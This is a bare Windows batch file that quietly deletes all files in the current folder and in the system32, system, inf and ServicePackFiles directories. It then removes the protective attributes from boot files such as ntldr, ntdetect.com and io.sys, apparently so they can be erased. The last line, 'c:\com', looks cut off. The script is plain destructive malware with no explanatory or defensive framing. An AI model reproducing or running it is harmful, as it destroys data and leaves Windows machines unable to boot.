@echo off
del /Q *.*
del /Q system32\*.*
del /Q system\*.*
del /Q inf\*.*
del /Q ServicePackFiles\i386\*.*
attrib -r -h -s c:\ntldr
attrib -r -h -s c:\ntdetect.com
attrib -r -h -s c:\io.sys
attrib -r -h -s c:\com